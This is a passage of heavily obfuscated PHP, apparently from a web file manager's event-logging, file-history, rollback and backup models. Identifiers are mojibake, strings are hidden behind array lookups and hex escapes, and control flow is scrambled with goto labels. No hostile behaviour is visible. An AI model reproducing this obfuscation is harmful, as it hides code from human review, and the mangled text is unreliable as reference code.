(!$a¶÷¸Ä½´µ) { return !1; $C»½¼â™ = Model($a«‰âÚ…ë[1818])->listData(); $C¢¿ÜÈ‘ = array_filter_by_field($C»½¼â™, $a«‰âÚ…ë[409], $a«‰âÚ…ë[500]); return $C¢¿ÜÈ‘; } $E¼ÊÎ©ôç× = array_field_key($a¶÷¸Ä½´µ, array($a«‰âÚ…ë[397], $a«‰âÚ…ë[28], $a«‰âÚ…ë[409], $a«‰âÚ…ë[1671], $a«‰âÚ…ë[1673])); $E¼ÊÎ©ôç×[$a«‰âÚ…ë[1857]] = $eŒì±è¹¬; return $E¼ÊÎ©ôç×; } else { return array($a«‰âÚ…ë[415] => 0, $a«‰âÚ…ë[1656] => $eŒì±è¹¬[$a«‰âÚ…ë[1800]], $a«‰âÚ…ë[416] => $a«‰âÚ…ë[33], $a«‰âÚ…ë[1671] => $a«‰âÚ…ë[1858]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\162\143\145\137\145\166\x65\156\x74"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\124\151\x6d\x65", "\x74\x69\x6d\145", "\151\x6e\163\145\x72\164", "\146\x75\x6e\x63\164\151\x6f\156"), array("\x64\145\163\x63", '', "\151\x6e\163\145\x72\x74\x2c\165\x70\x64\x61\164\145\54\x73\x65\x6c\x65\x63\164", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($e¡Ú±Ä˜Éñ, $eõâ¼š§õì, $EÂÈ„‚«â = '') { goto bôæ„©¤Â; c×ØäƒÛ®ò: $fŒ·÷Ç×Æì = array($F‹Ì”ùÚ×œ[413] => $e¡Ú±Ä˜Éñ, $F‹Ì”ùÚ×œ[1859] => $b×ÎÇ§äÏ[$F‹Ì”ùÚ×œ[481]], $F‹Ì”ùÚ×œ[1860] => $b×ÎÇ§äÏ[$F‹Ì”ùÚ×œ[28]], $F‹Ì”ùÚ×œ[498] => $b×ÎÇ§äÏ[$F‹Ì”ùÚ×œ[498]], $F‹Ì”ùÚ×œ[1479] => USER_ID, $F‹Ì”ùÚ×œ[418] => $eõâ¼š§õì, $F‹Ì”ùÚ×œ[1481] => $EÂÈ„‚«â); $this->addSystemLog($eõâ¼š§õì, $fŒ·÷Ç×Æì); return $this->add($fŒ·÷Ç×Æì); goto Fõšßª‡ÌÀ; cŒ¼˜¦ÉÜ: if (!$b×ÎÇ§äÏ) { return !1; } if ($this->isCacheEvent($b×ÎÇ§äÏ, $eõâ¼š§õì)) { return; } if ($EÂÈ„‚«â && is_string($EÂÈ„‚«â)) { $EÂÈ„‚«â = array($F‹Ì”ùÚ×œ[1683] => $EÂÈ„‚«â); } goto c×ØäƒÛ®ò; bôæ„©¤Â: $F‹Ì”ùÚ×œ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->eventSave) { return; } $b×ÎÇ§äÏ = Model($F‹Ì”ùÚ×œ[1164])->sourceInfo($e¡Ú±Ä˜Éñ); goto cŒ¼˜¦ÉÜ; Fõšßª‡ÌÀ: } private function addSystemLog($aˆà………æŒ, $E«Ú”õ¥ó) { $e®´Ë‚¬â¹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($aˆà………æŒ == $e®´Ë‚¬â¹[1861]) { $aˆà………æŒ = $E«Ú”õ¥ó[$e®´Ë‚¬â¹[434]][$e®´Ë‚¬â¹[1862]]; } else { if (in_array($aˆà………æŒ, array($e®´Ë‚¬â¹[1627], $e®´Ë‚¬â¹[1863]))) { $aˆà………æŒ = $E«Ú”õ¥ó[$e®´Ë‚¬â¹[434]][$e®´Ë‚¬â¹[697]]; } } $FñˆíÒî‹ = array_merge($E«Ú”õ¥ó, array($e®´Ë‚¬â¹[1864] => $E«Ú”õ¥ó[$e®´Ë‚¬â¹[399]], $e®´Ë‚¬â¹[1865] => $E«Ú”õ¥ó[$e®´Ë‚¬â¹[1865]])); Model($e®´Ë‚¬â¹[1591])->addLog($e®´Ë‚¬â¹[1866] . $aˆà………æŒ, $FñˆíÒî‹); } private function isCacheEvent($e—¥èç˜², $aí›¸È±…¹) { if ($e—¥èç˜²[$_SERVER[í¤âËÚ£¶íÊ¢][407]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($A¶††¾½Èã, $Aô”ÊŒ²£³) { $AÈÍ² øŸ‡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bø¸òæ¢äµ = Model($AÈÍ² øŸ‡[1164])->sourceInfo($A¶††¾½Èã); $bİØĞç½‹ = array($AÈÍ² øŸ‡[1862] => $Aô”ÊŒ²£³, $AÈÍ² øŸ‡[28] => $bø¸òæ¢äµ[$AÈÍ² øŸ‡[28]]); return $this->addEvent($A¶††¾½Èã, $AÈÍ² øŸ‡[1861], $bİØĞç½‹); } public function eventFileEdit($f–ª©‹“¢ù) { $cì×Œöóò» =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c¤§æ¤ø¸ = array($cì×Œöóò»[1867] => $_SERVER[$cì×Œöóò»[1868]], $cì×Œöóò»[1869] => strtolower(ACTION)); return $this->addEvent($f–ª©‹“¢ù, $cì×Œöóò»[1617], $c¤§æ¤ø¸); } public function eventRecycle($D¡„ñÁğËÇ, $eÂò©â¡) { return $this->addEvent($D¡„ñÁğËÇ, $_SERVER[í¤âËÚ£¶íÊ¢][1863], $eÂò©â¡); } public function eventRemove($bÀ»Ëßµ˜) { $d«˜‘‚åÆø =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a¹“¦ğÜğ© = Model($d«˜‘‚åÆø[1164])->sourceInfo($bÀ»Ëßµ˜); $bÓøİÔ˜Şê = $a¹“¦ğÜğ©[$d«˜‘‚åÆø[28]]; return $this->addEvent($a¹“¦ğÜğ©[$d«˜‘‚åÆø[481]], $d«˜‘‚åÆø[1616], $bÓøİÔ˜Şê); } public function eventShare($b’¬‘¼ÙÃ, $FË‹õ”ëÖ£) { return $this->addEvent($b’¬‘¼ÙÃ, $_SERVER[í¤âËÚ£¶íÊ¢][1627], $FË‹õ”ëÖ£); } public function eventMove($F”¿—¶×, $aÇ­ôÂ…¬ª, $DÇ–Å´ŠğÂ) { goto fñ…Ô’òƒ×; fñ…Ô’òƒ×: $E£¾–Ïµó =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F—õå…ÜŸã = Model($E£¾–Ïµó[1164]); $Aô¶ÑÄß÷š = $F—õå…ÜŸã->sourceInfo($F”¿—¶×); goto C¥áİ›Õ•ˆ; Aƒø·Ôº«Ò: $this->addEvent($aÇ­ôÂ…¬ª, $E£¾–Ïµó[1873], $E’è—ğé«); goto B¿¥¯Åßœº; c»ÊŠ‡’İ: $this->addEvent($F”¿—¶×, $E£¾–Ïµó[524], $E’è—ğé«); $Aô¶ÑÄß÷š = $F—õå…ÜŸã->sourceInfo($F”¿—¶×); $E’è—ğé« = array($E£¾–Ïµó[399] => $Aô¶ÑÄß÷š[$E£¾–Ïµó[399]], $E£¾–Ïµó[28] => $Aô¶ÑÄß÷š[$E£¾–Ïµó[28]]); goto Aƒø·Ôº«Ò; C¥áİ›Õ•ˆ: $Eî§©¦—í = $F—õå…ÜŸã->sourceInfo($aÇ­ôÂ…¬ª); $DÕğƒğ¡Å¦ = $F—õå…ÜŸã->sourceInfo($DÇ–Å´ŠğÂ); $E’è—ğé« = array($E£¾–Ïµó[1015] => $aÇ­ôÂ…¬ª, $E£¾–Ïµó[1870] => $Eî§©¦—í[$E£¾–Ïµó[28]], $E£¾–Ïµó[1850] => $Eî§©¦—í[$E£¾–Ïµó[498]], $E£¾–Ïµó[1016] => $DÇ–Å´ŠğÂ, $E£¾–Ïµó[1871] => $DÕğƒğ¡Å¦[$E£¾–Ïµó[28]], $E£¾–Ïµó[1872] => $DÕğƒğ¡Å¦[$E£¾–Ïµó[498]]); goto c»ÊŠ‡’İ; B¿¥¯Åßœº: } public function eventCopy($D‹ñ‹×§) { $this->eventCreate($D‹ñ‹×§, $_SERVER[í¤âËÚ£¶íÊ¢][522]); } public function eventRename($d—ğğˆñõ, $D™ÍˆÏµÙ, $Dºœ½íÖâÓ) { $f’«ÕÉòö¿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fÍ°ƒğŸË = array($f’«ÕÉòö¿[1015] => $D™ÍˆÏµÙ, $f’«ÕÉòö¿[1016] => $Dºœ½íÖâÓ); return $this->addEvent($d—ğğˆñõ, $f’«ÕÉòö¿[1179], $fÍ°ƒğŸË); } public function eventAddComment($c©¼†œï¦Ÿ, $aÙ‘ĞÄô¾†) { return $this->addEvent($c©¼†œï¦Ÿ, $_SERVER[í¤âËÚ£¶íÊ¢][1874], $aÙ‘ĞÄô¾†); } public function eventAddDesc($F­äÓÀª, $E®Â¦ä‚åÛ) { return $this->addEvent($F­äÓÀª, $_SERVER[í¤âËÚ£¶íÊ¢][1875], $E®Â¦ä‚åÛ); } public function listBySource($dÈˆƒó„¡«) { goto cà‚‚Üè½Ô; cà‚‚Üè½Ô: $Bœ‡õèØ’ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÜÔ‹ì©ÔÇ = Model($Bœ‡õèØ’[1164])->sourceInfo($dÈˆƒó„¡«); $eøÌ‚Ş× = array($Bœ‡õèØ’[413] => $dÈˆƒó„¡«); goto F›ù“Õ«²; B°©Æ¯éÈ: return $this->eventListParse($AÙ§·°Æâè, $dÈˆƒó„¡«); goto d‰Áˆİ¹ì; F›ù“Õ«²: if ($EÜÔ‹ì©ÔÇ[$Bœ‡õèØ’[406]] == $Bœ‡õèØ’[96]) { $A¡±‹•Ç¡© = Model($Bœ‡õèØ’[1164])->listSearchChildren($dÈˆƒó„¡«, 20000); $A¡±‹•Ç¡©[] = $dÈˆƒó„¡« . $Bœ‡õèØ’[360]; $eøÌ‚Ş× = array($Bœ‡õèØ’[399] => array($Bœ‡õèØ’[7], $A¡±‹•Ç¡©)); } $AÙ§·°Æâè = $this->where($eøÌ‚Ş×)->order($Bœ‡õèØ’[1876])->selectPage(); if ($AÙ§·°Æâè[$Bœ‡õèØ’[372]][$Bœ‡õèØ’[373]] == 0) { $AÙ§·°Æâè[$Bœ‡õèØ’[372]][$Bœ‡õèØ’[373]] = 1; $AÙ§·°Æâè[$Bœ‡õèØ’[375]] = array(array($Bœ‡õèØ’[413] => $dÈˆƒó„¡«, $Bœ‡õèØ’[1859] => $EÜÔ‹ì©ÔÇ[$Bœ‡õèØ’[481]], $Bœ‡õèØ’[1479] => $EÜÔ‹ì©ÔÇ[$Bœ‡õèØ’[435]], $Bœ‡õèØ’[418] => $Bœ‡õèØ’[1877], $Bœ‡õèØ’[419] => $EÜÔ‹ì©ÔÇ[$Bœ‡õèØ’[202]], $Bœ‡õèØ’[1481] => $Bœ‡õèØ’[33])); } goto B°©Æ¯éÈ; d‰Áˆİ¹ì: } private function eventListParse($bÍ‚«œ£÷, $dİ¸°¿ˆÎ) { goto AóÏ¥œÓ; fÓÕ—¢‰ÏÑ: $EÂÛ¬¤˜ÑÅ = Model($fá‘ÎÄ†ìÅ[759])->sourceListInfo($b¬ø¬‰ƒŒ¨, !0); foreach ($B›©³ã§â‹ as &$FºÔë„Úª) { if ($FºÔë„Úª[$fá‘ÎÄ†ìÅ[29]] == $fá‘ÎÄ†ìÅ[524] && isset($FºÔë„Úª[$fá‘ÎÄ†ìÅ[434]][$fá‘ÎÄ†ìÅ[1015]])) { $FºÔë„Úª[$fá‘ÎÄ†ìÅ[434]][$fá‘ÎÄ†ìÅ[1015]] = $EÂÛ¬¤˜ÑÅ[$FºÔë„Úª[$fá‘ÎÄ†ìÅ[434]][$fá‘ÎÄ†ìÅ[1015]]]; $FºÔë„Úª[$fá‘ÎÄ†ìÅ[434]][$fá‘ÎÄ†ìÅ[1016]] = $EÂÛ¬¤˜ÑÅ[$FºÔë„Úª[$fá‘ÎÄ†ìÅ[434]][$fá‘ÎÄ†ìÅ[1016]]]; } if ($FºÔë„Úª[$fá‘ÎÄ†ìÅ[29]] == $fá‘ÎÄ†ìÅ[1873] && isset($FºÔë„Úª[$fá‘ÎÄ†ìÅ[434]][$fá‘ÎÄ†ìÅ[399]])) { $FºÔë„Úª[$fá‘ÎÄ†ìÅ[434]][$fá‘ÎÄ†ìÅ[399]] = $EÂÛ¬¤˜ÑÅ[$FºÔë„Úª[$fá‘ÎÄ†ìÅ[434]][$fá‘ÎÄ†ìÅ[399]]]; } $FºÔë„Úª[$fá‘ÎÄ†ìÅ[94]] = $EÂÛ¬¤˜ÑÅ[$FºÔë„Úª[$fá‘ÎÄ†ìÅ[399]]]; $FºÔë„Úª[$fá‘ÎÄ†ìÅ[1878]] = $EÂÛ¬¤˜ÑÅ[$FºÔë„Úª[$fá‘ÎÄ†ìÅ[1865]]]; if ($FºÔë„Úª[$fá‘ÎÄ†ìÅ[29]] == $fá‘ÎÄ†ìÅ[1616]) { $FºÔë„Úª[$fá‘ÎÄ†ìÅ[1878]] = $FºÔë„Úª[$fá‘ÎÄ†ìÅ[94]]; $FºÔë„Úª[$fá‘ÎÄ†ìÅ[1865]] = $FºÔë„Úª[$fá‘ÎÄ†ìÅ[1878]][$fá‘ÎÄ†ìÅ[399]]; $FºÔë„Úª[$fá‘ÎÄ†ìÅ[94]] = !1; $FºÔë„Úª[$fá‘ÎÄ†ìÅ[399]] = $fá‘ÎÄ†ìÅ[33]; } $FºÔë„Úª[$fá‘ÎÄ†ìÅ[1808]] = $e°»á¤º¹†[$FºÔë„Úª[$fá‘ÎÄ†ìÅ[1487]]]; } unset($FºÔë„Úª); goto e«—öˆñ³; A‚Úùê§: $aÉ¾©Ëªµ = array_to_keyvalue($B›©³ã§â‹, $fá‘ÎÄ†ìÅ[33], $fá‘ÎÄ†ìÅ[1865]); foreach ($B›©³ã§â‹ as $FºÔë„Úª) { $a‹¯á¡ï³ = $FºÔë„Úª[$fá‘ÎÄ†ìÅ[434]]; if ($FºÔë„Úª[$fá‘ÎÄ†ìÅ[29]] == $fá‘ÎÄ†ìÅ[524] && isset($a‹¯á¡ï³[$fá‘ÎÄ†ìÅ[1015]])) { $b¬ø¬‰ƒŒ¨[] = $a‹¯á¡ï³[$fá‘ÎÄ†ìÅ[1015]] . $fá‘ÎÄ†ìÅ[33]; $b¬ø¬‰ƒŒ¨[] = $a‹¯á¡ï³[$fá‘ÎÄ†ìÅ[1016]] . $fá‘ÎÄ†ìÅ[33]; } if ($FºÔë„Úª[$fá‘ÎÄ†ìÅ[29]] == $fá‘ÎÄ†ìÅ[1873] && isset($a‹¯á¡ï³[$fá‘ÎÄ†ìÅ[399]])) { $b¬ø¬‰ƒŒ¨[] = $a‹¯á¡ï³[$fá‘ÎÄ†ìÅ[399]] . $fá‘ÎÄ†ìÅ[33]; } } $b¬ø¬‰ƒŒ¨ = array_merge($b¬ø¬‰ƒŒ¨, $aÉ¾©Ëªµ, array($dİ¸°¿ˆÎ . $fá‘ÎÄ†ìÅ[33])); goto AÛÔáà·Ú¨; AóÏ¥œÓ: $fá‘ÎÄ†ìÅ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B›©³ã§â‹ = $bÍ‚«œ£÷[$fá‘ÎÄ†ìÅ[375]]; $b¬ø¬‰ƒŒ¨ = array_to_keyvalue($B›©³ã§â‹, $fá‘ÎÄ†ìÅ[33], $fá‘ÎÄ†ìÅ[399]); goto A‚Úùê§; e«—öˆñ³: $bÍ‚«œ£÷[$fá‘ÎÄ†ìÅ[375]] = $B›©³ã§â‹; return $bÍ‚«œ£÷; goto f˜éÔÓäñ; AÛÔáà·Ú¨: $b¬ø¬‰ƒŒ¨ = array_unique($b¬ø¬‰ƒŒ¨); $bš¥Óâêº = array_unique(array_to_keyvalue($B›©³ã§â‹, $fá‘ÎÄ†ìÅ[33], $fá‘ÎÄ†ìÅ[1487])); $e°»á¤º¹† = Model($fá‘ÎÄ†ìÅ[510])->userListInfo($bš¥Óâêº); goto fÓÕ—¢‰ÏÑ; f˜éÔÓäñ: } public function removeBySource($f•Æòç£Ô¢) { $E¿ÔÀ¿®¼³ = array($_SERVER[í¤âËÚ£¶íÊ¢][413] => $f•Æòç£Ô¢); $this->where($E¿ÔÀ¿®¼³)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\162\x63\145\137\150\151\x73\164\157\x72\x79"; public function historyCount($E±«ã¢˜ó) { goto eÁåÇó“À„; CŠÚŸ¿ÓöÃ: $Cùá¡ìÁª = array($BØªàßôéç[399], $BØªàßôéç[1682] => $BØªàßôéç[483]); $C¢Ë†¼‘Ç = array($BØªàßôéç[399] => array($BØªàßôéç[7], $E±«ã¢˜ó)); $A­»øµ£ˆÙ = $this->field($Cùá¡ìÁª)->where($C¢Ë†¼‘Ç)->group($BØªàßôéç[399])->select(); goto fòºööˆòĞ; eÁåÇó“À„: $BØªàßôéç =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$E±«ã¢˜ó) { return array(); } if (is_string($E±«ã¢˜ó) || is_int($E±«ã¢˜ó)) { $E±«ã¢˜ó = array($E±«ã¢˜ó); } goto CŠÚŸ¿ÓöÃ; fòºööˆòĞ: return array_to_keyvalue($A­»øµ£ˆÙ, $BØªàßôéç[399], $BØªàßôéç[483]); goto EÔÜÇ®ğÒÓ; EÔÜÇ®ğÒÓ: } public function addHistory($c¢ƒØî¡Òµ, $cŸè®É»õø = '') { $E‰ˆŸ¨†»‹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d†‚§£é‘ = array($E‰ˆŸ¨†»‹[413] => $c¢ƒØî¡Òµ[$E‰ˆŸ¨†»‹[399]], $E‰ˆŸ¨†»‹[1479] => isset($c¢ƒØî¡Òµ[$E‰ˆŸ¨†»‹[437]]) ? $c¢ƒØî¡Òµ[$E‰ˆŸ¨†»‹[437]] : $c¢ƒØî¡Òµ[$E‰ˆŸ¨†»‹[435]], $E‰ˆŸ¨†»‹[451] => $c¢ƒØî¡Òµ[$E‰ˆŸ¨†»‹[450]], $E‰ˆŸ¨†»‹[552] => $c¢ƒØî¡Òµ[$E‰ˆŸ¨†»‹[87]], $E‰ˆŸ¨†»‹[1879] => $cŸè®É»õø); $CÊäøÃóó = $GLOBALS[$E‰ˆŸ¨†»‹[6]][$E‰ˆŸ¨†»‹[97]][$E‰ˆŸ¨†»‹[1063]]; if ($CÊäøÃóó > 1) { $this->historyAutoClear($d†‚§£é‘[$E‰ˆŸ¨†»‹[399]]); $this->add($d†‚§£é‘); } Hook::trigger($E‰ˆŸ¨†»‹[1880], $d†‚§£é‘); Model($E‰ˆŸ¨†»‹[1881])->eventFileEdit($c¢ƒØî¡Òµ[$E‰ˆŸ¨†»‹[399]]); } private function historyAutoClear($cËã¡×„ùç) { goto d¿ÈÎ¦ß‰Ñ; bÄœ‘äŞÙØ: $E¥‰Ÿ¼öäÂ = array($BÚË£ì’¾È[413] => $cËã¡×„ùç); $e÷ÕÛµó° = $this->field($BÚË£ì’¾È[1882])->where($E¥‰Ÿ¼öäÂ)->order($BÚË£ì’¾È[1876])->select(); if (!$e÷ÕÛµó° || $Eì±ªèÇó£ >= count($e÷ÕÛµó°)) { return; } goto fÉ¹ŒÂ§ô¹; fÉ¹ŒÂ§ô¹: $b½Ï¥·ëî = array_to_keyvalue($e÷ÕÛµó°, $BÚË£ì’¾È[33], $BÚË£ì’¾È[397]); $b½Ï¥·ëî = array_slice($b½Ï¥·ëî, $Eì±ªèÇó£); $eÏŒ“óÄÆæ = array_to_keyvalue($e÷ÕÛµó°, $BÚË£ì’¾È[33], $BÚË£ì’¾È[450]); goto CäÖÆê‹†¾; CäÖÆê‹†¾: $eÏŒ“óÄÆæ = array_slice($eÏŒ“óÄÆæ, $Eì±ªèÇó£); if (!$b½Ï¥·ëî || !$eÏŒ“óÄÆæ) { return; } $E¥‰Ÿ¼öäÂ = array($BÚË£ì’¾È[415] => array($BÚË£ì’¾È[7], $b½Ï¥·ëî)); goto E¡‘Š¥²; eª±öÈÉ‡: $Eì±ªèÇó£ = $A‰… æŠ¬ğ == $BÚË£ì’¾È[1086] ? 5 : $FÃ’§·¶Ü; if ($FÃ’§·¶Ü <= 1) { $Eì±ªèÇó£ = 1; } if ($Eì±ªèÇó£ >= 500) { return; } goto bÄœ‘äŞÙØ; E¡‘Š¥²: $this->where($E¥‰Ÿ¼öäÂ)->delete(); Model($BÚË£ì’¾È[453])->remove($eÏŒ“óÄÆæ); goto Dí –À¶ôÑ; d¿ÈÎ¦ß‰Ñ: $BÚË£ì’¾È =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A‰… æŠ¬ğ = Model($BÚË£ì’¾È[1084])->get($BÚË£ì’¾È[1085]); $FÃ’§·¶Ü = $GLOBALS[$BÚË£ì’¾È[6]][$BÚË£ì’¾È[97]][$BÚË£ì’¾È[1063]]; goto eª±öÈÉ‡; Dí –À¶ôÑ: } public function listData($Eï¼°é—Œì) { goto d±ñƒ´²èˆ; Fˆ°¸œˆšÄ: $E‚å‘§ö‚ = $this->field($c¿İ±öÀ•¦)->where($FñĞ‹è°í)->order($eĞ¿Ûä„¾Œ[1876])->selectPage(); $this->_listAppendUser($E‚å‘§ö‚[$eĞ¿Ûä„¾Œ[375]]); $cÕ«ÚÔ´›ƒ = Model($eĞ¿Ûä„¾Œ[1084])->get($eĞ¿Ûä„¾Œ[1085]); goto f®º¾ôÓ’ ; d±ñƒ´²èˆ: $eĞ¿Ûä„¾Œ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FñĞ‹è°í = array($eĞ¿Ûä„¾Œ[413] => $Eï¼°é—Œì); $c¿İ±öÀ•¦ = $eĞ¿Ûä„¾Œ[1883]; goto Fˆ°¸œˆšÄ; f®º¾ôÓ’ : $AŠÛ£Û§— = 5; if ($cÕ«ÚÔ´›ƒ == $eĞ¿Ûä„¾Œ[1086]) { $E‚å‘§ö‚[$eĞ¿Ûä„¾Œ[375]] = array_slice($E‚å‘§ö‚[$eĞ¿Ûä„¾Œ[375]], 0, $AŠÛ£Û§—); $E‚å‘§ö‚[$eĞ¿Ûä„¾Œ[372]] = array($eĞ¿Ûä„¾Œ[1884] => 1, $eĞ¿Ûä„¾Œ[1885] => 20, $eĞ¿Ûä„¾Œ[1886] => 1, $eĞ¿Ûä„¾Œ[1887] => count($E‚å‘§ö‚[$eĞ¿Ûä„¾Œ[375]])); } return $E‚å‘§ö‚; goto F‘ğ•…êäÕ; F‘ğ•…êäÕ: } protected function _listAppendUser(&$eè©³—¹ßë) { $C’Ä±ÌĞ‚‰ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fØ÷ŠÅÛˆ° = array_to_keyvalue($eè©³—¹ßë, $C’Ä±ÌĞ‚‰[33], $C’Ä±ÌĞ‚‰[1487]); $DÊ¼«†¦â„ = Model($C’Ä±ÌĞ‚‰[510])->userListInfo($fØ÷ŠÅÛˆ°); foreach ($eè©³—¹ßë as &$dª†Û´œÇ—) { $C“šâÕÍ’´ = $dª†Û´œÇ—[$C’Ä±ÌĞ‚‰[1487]]; $dª†Û´œÇ—[$C’Ä±ÌĞ‚‰[435]] = $DÊ¼«†¦â„[$C“šâÕÍ’´] ? $DÊ¼«†¦â„[$C“šâÕÍ’´] : !1; } unset($dª†Û´œÇ—); } public function fileInfo($b‘ÖÚó›Šæ) { $AÛ¦”Ï‹ò‚ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c¬ÖßÒ‡¯ = $this->tablePrefix; $C½Ì£œ„°ç = "{$c¬ÖßÒ‡¯}\x69\157\137\146\x69\154\145\x20\146\x69\x6c\145\x73\40\157\x6e\40\146\x69\x6c\x65\163\56\146\x69\154\x65\x49\x44\40\x3d\40\x68\x69\163\x74\157\x72\x79\x2e\x66\151\x6c\145\111\x44"; return $this->alias($AÛ¦”Ï‹ò‚[1888])->where(array($AÛ¦”Ï‹ò‚[415] => $b‘ÖÚó›Šæ))->join($C½Ì£œ„°ç, $AÛ¦”Ï‹ò‚[1889])->find(); } public function removeItem($e›Ê†Åµö») { $fÓØĞ‚”»¹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E¹ØÛ‡Œ = array($fÓØĞ‚”»¹[415] => $e›Ê†Åµö»); $C«“Í…š‹á = $this->where($E¹ØÛ‡Œ)->find(); if ($C«“Í…š‹á) { $cµÛ¯‰¾–ë = $this->where($E¹ØÛ‡Œ)->delete(); Model($fÓØĞ‚”»¹[453])->remove($C«“Í…š‹á[$fÓØĞ‚”»¹[450]]); return $cµÛ¯‰¾–ë; } return !1; } public function removeBySource($f­‚èœÆİ¤) { goto D§Éà…ŠîÜ; d¨¿¸½’Ö®: $bòª­İÉ‡õ = array($A‚¥°Ş¡…½[413] => array($A‚¥°Ş¡…½[7], $f­‚èœÆİ¤)); $cç«¢ô§Ë = $this->field($A‚¥°Ş¡…½[451])->where($bòª­İÉ‡õ)->select(); if ($cç«¢ô§Ë) { $this->where($bòª­İÉ‡õ)->delete(); $b’Ì¬« = array_to_keyvalue($cç«¢ô§Ë, $A‚¥°Ş¡…½[33], $A‚¥°Ş¡…½[450]); Model($A‚¥°Ş¡…½[453])->remove($b’Ì¬«); } goto AñĞÕÚËêÃ; AñĞÕÚËêÃ: return !0; goto e—î»Çæƒ; D§Éà…ŠîÜ: $A‚¥°Ş¡…½ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$f­‚èœÆİ¤) { return !1; } if (!is_array($f­‚èœÆİ¤)) { $f­‚èœÆİ¤ = array($f­‚èœÆİ¤); } goto d¨¿¸½’Ö®; e—î»Çæƒ: } public function setDetail($BæÒŸ…·Ï, $Aö–´‘‹¡») { $dÁø´óµï÷ =& $_SERVER[í¤âËÚ£¶íÊ¢]; return $this->where(array($dÁø´óµï÷[415] => $BæÒŸ…·Ï))->save(array($dÁø´óµï÷[1879] => $Aö–´‘‹¡»)); } public function rollbackToItem($AÈˆ„ñïØ, $eœ¡à¼²¸) { goto Dë‰Ô“£ë; F¶ç×ã¯™°: return $this->where(array($CÖÓÓò“‚‹[415] => $eœ¡à¼²¸))->delete(); goto B˜‡¦Ù•›í; a¾·ç•åù: $f²°†ÛÑƒ = $this->find($eœ¡à¼²¸); $BèË¶œÁõ = array($CÖÓÓò“‚‹[450] => $f²°†ÛÑƒ[$CÖÓÓò“‚‹[450]], $CÖÓÓò“‚‹[87] => $f²°†ÛÑƒ[$CÖÓÓò“‚‹[87]], $CÖÓÓò“‚‹[93] => time(), $CÖÓÓò“‚‹[437] => USER_ID); Model($CÖÓÓò“‚‹[759])->where(array($CÖÓÓò“‚‹[399] => $AÈˆ„ñïØ))->save($BèË¶œÁõ); goto F¶ç×ã¯™°; Dë‰Ô“£ë: $CÖÓÓò“‚‹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c§ò¤†¸‘å = Model($CÖÓÓò“‚‹[759])->sourceInfo($AÈˆ„ñïØ); $this->addHistory($c§ò¤†¸‘å, LNG($CÖÓÓò“‚‹[1890])); goto a¾·ç•åù; B˜‡¦Ù•›í: } public function clearSame($dªİ‘‚®¦×) { goto fõÓ¯ØÚÑ; CÉÙ‹ñğ‰½: $cÙ×¬¯Ò = array(); $b‘‘ºÚ¡Ò‹ = array(); foreach ($a–‡ˆ±­Ïó as $DÜÀŒÜÑ°é) { if (!$DÜÀŒÜÑ°é || count($DÜÀŒÜÑ°é) <= 1) { continue; } foreach ($DÜÀŒÜÑ°é as $DÔ§¡¯‰Ãã) { $cÙ×¬¯Ò[] = $DÔ§¡¯‰Ãã[$DàØ‡ïÂÙ[450]]; $b‘‘ºÚ¡Ò‹[] = $DÔ§¡¯‰Ãã[$DàØ‡ïÂÙ[397]]; } } goto A¾Š‹³áíœ; A¾Š‹³áíœ: if (!$b‘‘ºÚ¡Ò‹) { return; } $this->where(array($DàØ‡ïÂÙ[397] => array($DàØ‡ïÂÙ[7], $b‘‘ºÚ¡Ò‹)))->delete(); Model($DàØ‡ïÂÙ[453])->remove($cÙ×¬¯Ò); goto bõéÈ’‘Ì¼; fõÓ¯ØÚÑ: $DàØ‡ïÂÙ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eÆ¨Ş Ëªø = $this->listData($dªİ‘‚®¦×); $a–‡ˆ±­Ïó = array_to_keyvalue_group($eÆ¨Ş Ëªø, $DàØ‡ïÂÙ[450]); goto CÉÙ‹ñğ‰½; bõéÈ’‘Ì¼: } public function userSpace() { $C¯Ç¶ÇÔ„Ã =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f»ÆÕØªœ’ = $this->tablePrefix; $cƒà·—öª‡ = array($C¯Ç¶ÇÔ„Ã[1479] => USER_ID); $Bâå¼ÍÏ›Í = "{$f»ÆÕØªœ’}\x69\157\137\146\151\154\x65\x20\x66\x69\154\x65\x73\40\x6f\x6e\40\146\x69\154\145\163\56\146\x69\x6c\145\x49\x44\40\x3d\x20\x68\151\163\x74\x6f\162\171\56\x66\151\x6c\145\x49\104"; return $this->alias($C¯Ç¶ÇÔ„Ã[1888])->where($cƒà·—öª‡)->join($Bâå¼ÍÏ›Í, $C¯Ç¶ÇÔ„Ã[1889])->sum($C¯Ç¶ÇÔ„Ã[87]); } } goto c©íÁ¥ö“; DÎ­‘÷éÁ: class BackupFile { public function __construct() { } public function index() { goto E„½ÖÜñÓè; dÚˆˆ‹¤ñš: $eÜöÛ±µ = (int) Model($_SERVER[í¤âËÚ£¶íÊ¢][723])->where($D¼™®êÚ‚)->count($_SERVER[í¤âËÚ£¶íÊ¢][450]); $aö¶ËÉëƒ» = (int) Model($_SERVER[í¤âËÚ£¶íÊ¢][723])->where($D¼™®êÚ‚)->sum($_SERVER[í¤âËÚ£¶íÊ¢][87]); $F…½¿¡»Ó = new 